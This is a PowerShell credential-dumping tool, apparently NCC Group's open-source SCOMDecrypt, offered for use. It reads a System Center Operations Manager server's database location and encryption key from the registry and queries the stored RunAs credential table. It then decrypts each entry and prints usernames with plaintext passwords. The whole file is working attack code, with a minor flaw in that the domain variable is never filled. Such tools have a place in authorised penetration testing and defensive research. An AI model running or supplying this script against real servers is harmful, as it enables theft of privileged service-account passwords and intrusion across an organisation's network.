<#
Released as open source by NCC Group Plc - http://www.nccgroup.com/

Developed by Richard Warren, richard dot warren at nccgroup dot trust

https://www.github.com/nccgroup/SCOMDecrypt

Released under AGPL see LICENSE for more information
#>



function Invoke-SCOMDecrypt {

	# Check if SCOM 2016 is installed	
	if(Test-Path "C:\Program Files\Microsoft System Center 2016")
	{
		[System.Reflection.Assembly]::LoadFile("C:\Program Files\Microsoft System Center 2016\Operations Manager\Server\Microsoft.Mom.Sdk.SecureStorageManager.dll") | Out-Null 
		[System.Reflection.Assembly]::LoadFile("C:\Program Files\Microsoft System Center 2016\Operations Manager\Server\Microsoft.EnterpriseManagement.DataAccessLayer.dll") | Out-Null
	}
	elseif(Test-Path "C:\Program Files\Microsoft System Center 2012 R2")
	{
		[System.Reflection.Assembly]::LoadFile("C:\Program Files\Microsoft System Center 2012 R2\Operations Manager\Server\Microsoft.Mom.Sdk.SecureStorageManager.dll") | Out-Null
		[System.Reflection.Assembly]::LoadFile("C:\Program Files\Microsoft System Center 2012 R2\Operations Manager\Server\Microsoft.EnterpriseManagement.DataAccessLayer.dll") | Out-Null
	}
	else
	{
		Write-Host "[!] Unable to find installation directory of SCOM 2012 R2 or 2016"
		return
	}

	$scom = New-Object Microsoft.EnterpriseManagement.Security.SecureStorageManager
	$server = $null
	$database = $null
	$key = $null

	Try
	{
		$reg = Get-ItemProperty "hklm:SOFTWARE\Microsoft\System Center\2010\Common\Database" -erroraction stop
		$server = $reg.DatabaseServerName
		$database = $reg.DatabaseName
	}
	Catch [System.Management.Automation.ItemNotFoundException]
	{
		Write-Host "[!] Unable to detect SQL server"
		return
	}

	Try
	{
		$reg = Get-ItemProperty "hklm:SOFTWARE\Microsoft\System Center\2010\Common\MOMBins" -erroraction stop
		$key = $reg.Value1
	}
	Catch [System.Management.Automation.ItemNotFoundException]
	{
		Write-Host "[!] Unable to find key"
		return
	}
	
	$sqlCommand = "SELECT UserName, Data, Domain FROM dbo.CredentialManagerSecureStorage;"
	$connectionString = "Server=$server;Database=$database;Trusted_Connection=True;"
	$connection = new-object system.data.SqlClient.SQLConnection($connectionString)
	$command = new-object system.data.sqlclient.sqlcommand($sqlCommand,$connection)
	$connection.Open()
	$adapter = New-Object System.Data.sqlclient.sqlDataAdapter $command
	$dataset = New-Object System.Data.DataSet
	$adapter.Fill($dataSet) | Out-Null
	$connection.Close()
	
	for($i=0;$i -lt $dataset.Tables[0].Rows.Count;$i++)
	{ 
		if($dataset.Tables[0].Rows[$i].Data -ne [System.DBNull]::Value -and $dataset.Tables[0].Rows[$i].Username -ne [System.DBNull]::Value)
		{
			$user = $dataset.Tables[0].Rows[$i].Username
			$passw = [System.Text.Encoding]::UTF8.GetString($scom.Decrypt($dataset.Tables[0].Rows[$i].Data))
			
			# Cleans up the spaces in the password
			$truePass = ""
			for($j = 0; $j -lt $passw.Length; $j++)
			{
				if($j % 2 -eq 0)
				{
					$truePass += $passw[$j]
				}
			}
			
			if($domain -notlike "")
			{
				Write-Host "[+] $domain\$user : $truePass"
			}
			else
			{
				Write-Host "[+] $user : $truePass"
			}
		}
	}
}
